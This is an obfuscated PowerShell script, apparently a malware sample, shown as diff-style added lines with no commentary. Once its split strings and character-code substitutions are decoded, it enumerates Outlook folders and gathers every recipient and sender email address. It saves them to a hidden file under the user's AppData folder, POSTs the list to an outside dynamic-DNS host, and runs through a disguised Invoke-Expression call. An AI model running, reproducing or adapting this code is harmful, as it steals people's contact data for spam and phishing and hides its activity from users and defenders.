+KQiqifzkp = ['+'Char[]](110,97,104,109,121,115,102,111,108,116,120,100,119,118,112,113,99,105,107,117,9'+'8'+',10'+'1,106,114,122,103,32,'+'67,111,110,103,114,97,116,117,108,97,116,105,111,110,33,33,32,39,105,112,58,49,55,48,46,49,'+'49,56,46,49,5'+'4,49,46,49,49,49,39)'+'
+function __/wou/wou__/wou_/===wou_/(KQi{___/wou/==wou_/='+'=wou/='+'wou/'+'}) {
+  for(KQi{__/wou/wou_'+'_/=wou/wou__/wou} = 1;KQi{__/wou/wou__/=wou/wou__/wou} -le KQi{___/wou/==wou_/==wou/=wou/}.Count;KQi{__/wou/wou__/=wou/wou__/wou}++) {
+    KQi{_/==='+'===wou_/=wou'+'/=wou_} = KQi{___/w'+'ou/==wou_/==wou/=w'+'ou/}.Item(KQi{__/w'+'ou/wou__/=wou/wou__/wou})
+    KQi'+'{__/wou/=wou_'+'__/wou_/==wou} = KQi{_/'+'======wou_/=wou/=wou_}.Items
+ '+'   for(KQi{/==wou/wou/wou'+'_/wou_/wou__/} = 1;KQi{/==wou/wou/wou_/w'+'ou_/wou__/} -le KQi{__/wou/=wou___/wou_/==wou}.Count;KQi{/==wou/wo'+'u/wou_/wou_/wou__/}++) {
+      '+'KQi{_/==wou_____/==wou__/} = KQi{__/wou/=wou___/wou_/==wou}.'+'Item(KQi{/==wou/wou/wou_/wou_/wou__/})
+      KQi{/=wou/====wou____/=wou/} = KQi{_/==wou_____'+'/==wou__/}.Recipients
+   '+'   for(K'+'Qi{_/wou_/wou__/wou/wou_/=wou_} = 1;'+'KQi{_/wou_/wou__'+'/wou/wou_/=wou_} -le KQi{/=wou/====wou_'+'___/=wou/}.Count;KQi{_/wou_/wou__/wou/wou_/=wou_}++) {
+  '+'      KQi{__/wou_'+'/wou__/=wou/wou_/wou} = KQi{/=wou/====wou___'+'_/=wou/}.Item(KQi{_/wou_/'+'w'+'ou__/w'+'ou/wou_/=wou_})
+        KQi{_/wou_/wou__/wou_____/=} = KQi{__/wou_/wou__/=wou/wou_'+'/wou}.'+'AddressEntry
+        KQi{__/===wou/===wou/wou/wou_} = KQi{_/wou_/w'+'ou__/wou_____/=}.AddressEntryUserType
+      '+'  KQi{____/wou____/wou/wou_/wou_} = ocnocn;
+        if (KQi{__/='+'==wou/===wou/wou/wou_} -eq 0) {
+          KQ'+'i{____/wou____/wou/w'+'ou_/wou_} '+'= KQi{_/wou_/wou__/wou_____/=}.GetExchangeUser().Prim'+'arySmtpAddress
+        } else'+'if ((KQi{__/===wou/===wou/wou/wou_} -eq 30) -Or (KQi{__/===wou/===wou/wou/wou_} -eq 10)) '+'{
+          KQi{___'+'_/wou____/wou/wou_/wou_} = KQi{_/wou_/wou__/wou_____/='+'}.'+'Address
+       '+' }
+        _/=wou_'+'/==wou__'+'__/wou__/(KQi{____'+'/w'+'ou____/wou/wou_/wou_})
+      }
+      KQi{_/wou_/wou__/wou____'+'_/=} = KQ'+'i{_'+'/==wou_____/==wou__/}.Sender
+      KQi{__/===wou/===wou/w'+'ou/wou_} '+'= KQi{_/wou_/wou__/wou_____/=}.AddressEntryUserType
+      KQi{____/'+'wou____/wou/'+'wou_/wou_} = ocno'+'cn;
+      if (KQi{__/===w'+'ou/===wou/wou/wou_} -eq 0) {
+        KQi{____/wou____/wou/wou_/wou_} = KQi{_/wou_/wou__/wou_____/=}.GetExchang'+'eUser'+'().PrimarySmtp'+'Address
+      } elseif ((KQi{__/===wou/===wou/wou/wou_} -eq 30) -Or (KQi{__/===wou/===wou/wou/wou_}'+' -eq 10)) {
+        KQi{____/wou____/wou'+'/wou_/wou_} = KQi{_/wou_/wou__/wo'+'u_____/=}.Address
+      }
+  '+'    _/=wou_/==wou_'+'___/wou__/(KQi{____/wou____/wou/wou_/wou_})
+    }
+    __/wou/wou__'+'/'+'wou_/===wou_/(KQi{'+'_/======wou_/=wou/=wou_}.Folders)
+  }
+}
+KQiqifzkp ZwY %{KQiivnax += [Char]KQi_}
+'+'function ____/=wou_/wou_/==wou/==() {
+  _/====wou__/=====wou_/
+  __/w'+'ou/wou__/wou_/===wou_/(KQi{____/===wou__'+'_'+'__/wou/}.Fol'+'de'+'r'+'s)
+  Add-Content KQiExecutionCo'+'n'+'text.In'+'vokeCommand.ExpandString([Te'+'xt.Encoding]::Unicode.GetString([Convert]::FromBase64String(1UqJ'+'ABlA'+'G4'+'AdgA6'+'AEEAUABQAEQAQQBUAE'+'EAXABNAGkAYw'+'ByAG8AcwBvAGYAdABcAC4ATwB1AHQAbABvAG8AawA=1Uq)))  KQi{_/wou/=====wou__/=wou/=}
+  
+'+'  KQiWebR'+'equest = [System.Net.WebRequest]::Create(ocnhttp://vqz8.gotdns.c'+'h/mx/lists/kk/index.php?listoc'+'n'+')
+  KQiGlobalListS'+'tr = [System.Text.Encoding]::UTF8'+'.GetBytes(ocnli'+'st=KQi(KQi{_/w'+'ou/=====wou__/=wou/=} -j'+'oin 1Uq;1Uq)ocn)
+  KQiWebRequewrite-hostd = 1UqPOST1Uq
+  KQiWebRequest.ContentType = 1U'+'qapplication/x-www-form-urle'+'ncode'+'d1Uq
+  KQiWebRequest.ContentLength '+'= KQiGlobalListStr.length
+  KQiReque'+'stStr'+'eam = KQiWebReque'+'st.GetRequestStream()
+  KQiRequestStream.Write(KQiGlobalListStr, 0, KQiGlobalListStr.length)
+  '+'KQiRequestStream'+'.Close()
+  [System.Net.WebResponse] KQiWebResponse = KQiWebRequest.G'+'etRe'+'sponse()
+  
+}
+KQiivnax ZwY out-null
+function _/=wou/wou/wou_/wou____/=wou() {
+  KQi{__/==wou/wou__/wou/'+'===wou} = [Syste'+'m.IO.File]::Exists('+'KQi{__/======wo'+'u____/wou_})
+  if (-Not KQi'+'{__/==wou/wou__/wou/===wou})'+' {
+      ocnocn ZwY sc KQi{__/======wou____/wou_}
+      ____/=wou_/wou_/==wou'+'/==
+  }
+}
+
+_/='+'wou/wou/wou_'+'/wou____/=wou
+')  -CrEPLaCe ([cHar]90+[cHar]119+[cHar]89),[cHar]124  -replacE([cHar]75+[cHar]81+[cHar]105),[cHar]36-CrEPLaCe  ([cHar]111+[cHar]99+[cHar]110),[cHar]34  -CrEPLaCe([cHar]49+[cHar]85+[cHar]113),[cHar]39-replacE  ([cHar]119+[cHar]111+[cHar]117),[cHar]92)|& ((VArIABle '*mdR*').NaMe[3,11,2]-Join'')
